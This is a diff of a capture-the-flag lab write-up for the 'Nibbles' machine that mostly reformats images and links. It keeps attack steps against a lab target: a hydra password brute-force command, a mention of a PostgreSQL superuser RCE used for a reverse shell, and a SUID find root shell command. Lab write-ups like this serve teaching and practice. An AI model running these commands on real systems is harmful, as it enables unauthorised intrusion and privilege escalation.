@@ -34,11 +34,11 @@ Nmap done: 1 IP address (1 host up) scanned in 133.81 seconds
 ## HTTP (TCP/80)
 The target machine is running an Apache web server on port 80
 
-INS IMG 1
+![Nibbles](/assets/img/NibblesPG(1).png)
 
 After digging around the contents of the website and running a gobuster sub-directory scan there was no significant entry point for a foothold
 
-INS IMG 2
+![Nibbles](/assets/img/NibblesPG(2).png)
 
 ## PostgreSQL (TCP/5437)
 
@@ -95,10 +95,9 @@ postgres=# \du+
  postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | 
 ~~~
 
-After researching I found a way to read directories and files by creating a database table and populating it with data on the targets local filesystem, which identified a user on the system named 'wilson'
-https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
+After researching and with the help of [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) I found a way to read directories and files by creating a database table and populating it with data on the targets local filesystem, which identified a user on the system named 'wilson'
 
-INSIMG3
+![Nibbles](/assets/img/NibblesPG(3).png)
 
 I then ran a hydra password brute force attempt on the wilson user account through the FTP service, but had no success so decided to dig deeper into what Superusers can do.
 ~~~shell
@@ -106,7 +105,7 @@ I then ran a hydra password brute force attempt on the wilson user account throu
 └─$ hydra -l wilson -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ftp://192.168.191.47
 ~~~
 
-I found a RCE(https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) exploit that works for Superusers on PostgreSQL version 9.3+ and used it to execute a reverse shell
+I found a [RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) exploit that works for Superusers on PostgreSQL version 9.3+ and used it to execute a reverse shell
 
 Create listener on port 80
 
@@ -137,19 +136,19 @@ whoami
 postgres
 ~~~
 
-I ran a scan using linpeas.sh which identified the "find" binary has the SUID bit set, which can be used to elevate privileges through the -exec option of the find cmdlet as discussed in GTFOBins(https://gtfobins.github.io/gtfobins/find/#suid) list of binaries and bypasses
-
+I ran a scan using linpeas.sh which identified the "find" binary has the SUID bit set, which can be used to elevate privileges through the -exec option of the find cmdlet as discussed in [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) list of binaries and bypasses
 ~~~shell
                       ╔════════════════════════════════════╗
-══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                           
-                      ╚════════════════════════════════════╝                                                                                                                 
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
+                      ╚════════════════════════════════════╝
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                             
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
 strings Not Found                                                                                                                                                            
 strace Not Found                              
 -rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
 ~~~
 
+Executing the PrivEsc
 ~~~shell
 $ find . -exec /bin/sh -p \; -quit
 # whoami
